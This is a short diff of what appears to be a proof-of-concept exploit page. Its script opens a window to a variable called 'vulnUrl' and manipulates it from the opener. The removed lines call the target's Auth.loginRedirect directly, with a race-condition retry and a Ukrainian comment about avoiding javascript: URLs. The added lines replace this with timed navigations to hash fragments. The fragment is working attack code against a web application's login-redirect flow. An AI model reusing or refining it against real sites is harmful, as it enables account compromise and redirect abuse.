@@ -9,17 +9,15 @@ const w = window.open(vulnUrl, '_blank');
 
 setTimeout(() => {
   try {
-    // 🔥 ВАЖЛИВО: не javascript:, а прямий виклик
-    w.Auth.loginRedirect(1);
-  } catch (e) {
-    // fallback якщо race condition
-    setTimeout(() => {
-      try {
-        w.Auth.loginRedirect(1);
-      } catch(e){}
-    }, 1000);
-  }
-}, 2000);
+    w.location = vulnUrl + "#1";
+  } catch (e) {}
+}, 1500);
+
+setTimeout(() => {
+  try {
+    w.location = vulnUrl + "#2";
+  } catch (e) {}
+}, 2500);
 </script>
 </body>
 </html>
